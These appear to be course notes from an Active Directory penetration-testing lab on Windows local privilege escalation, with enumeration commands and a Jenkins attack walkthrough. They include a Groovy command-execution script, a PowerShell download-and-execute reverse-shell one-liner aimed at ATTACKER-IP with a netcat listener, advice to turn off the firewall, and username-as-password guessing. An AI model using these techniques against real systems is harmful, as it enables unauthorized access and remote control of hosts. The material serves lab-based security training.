# **Local Privilege Escalation**

There are various ways of locally escalating privileges on windows box -:
- Missing patches
- Automated deployment and Auto Logon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and more
- NTLM Relaying a.k.a won't fix


We can use below tools for complete coverage


- PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- PrivEsc - https://github.com/enjoiz/Privesc
- WinPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/

# Service Issues using `PowerUp`

- Get services with unquoted paths and a space in their name


```powershell
$ Get-ServiceUnquoted -Verbose
```



- Get services where the current user can write to its binary or change arguments to the binary

```powershell
$ Get-ModifiableServiceFile -Verbose
```



- Get the services whose configuration current user can modify

```powershell
$ Get-ModifiableService -Verbose
```



We can also automate this by using the below commands


```powershell
# For Powerup
$ Invoke-AllChecks

# For PrivEsc
$ Invoke-PrivEsc

# For PEASS-ng
$ winPEASx64.exe
```

**Feature Abuse**

â€¢ What we have been doing up to now (and will keep doing further in the
class) is relying on features abuse.
â€¢ Features abuse are awesome as there are seldom patches for them and
they are not the focus of security teams!
â€¢ One of my favorite features abuse is targeting enterprise applications
which are not built keeping security in mind.
â€¢ On Windows, many enterprise applications need either Administrative
privileges or SYSTEM privileges making them a great avenue for privilege
escalation.

**Example - Jenkins -:**


â€¢ Letâ€™s use an older version of Jenkins as an example of vulnerable
Enterprise application.
â€¢ Jenkins is a widely used Continuous Integration tool.
â€¢ There are many interesting aspects with Jenkins but for now we would
limit our discussion to the ability of running system commands on
Jenkins.
â€¢ There is a Jenkins server running on dcorp-ci (172.16.3.11) on port
8080.

**Exploit -:**

- If we have admin access (default installation before 2.x)
- Navigate to `http://<jenkins_server/script`
- Now paste in below groovy script, Make sure to replace [INSERT COMMAND] with your own command

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```



- If you don't have admin access but could add or edit build steps in the build configuration. 
- Add a build step, Navigate to `/job/Project0/configure` (If you get a `403` keep changing Project0 to Project1, Pro...2, ..........3 till you get a `200`)
- Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:

```powershell
powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443
```

- Now we can go ahead and start up a listener with netcat using the `netcat.exe` version to listen on the specified port

```bat
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

- Also we need to host our `Invoke-PowerShellTcp.ps1` script as stated in the payload, we can use a tool called **HTTP File Server (HFS)** or just try to google what works for you (Drag and drop the `Invoke-PowerShellTcp.ps1` to the left pane )

- We also need to turn off windows firewall for this to work, so do that also

- Again, you could download and execute scripts, run encoded scripts and more.


> **General Note :** Many users use their username as password so make sure to try something like `manager:manager`



# **Learning Objective 5**


- Exploit a service on dcorp-studentx and elevate privileges to local administrator:
- Solution:
```
# Add users to a local group by abusing the services where users can change arguments to the binary:
https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/ 
```
  
- Identify a machine in the domain where studentx has local administrative access.
- Solution
```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```
  
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server

## **Solution**


**_Coming Soon_**

> **Note :** Renaming a local admin account might be recommended but renaming a domain admin account is not recommended, THEY can still detect you are Admin, by your **SID** ðŸ™‚.
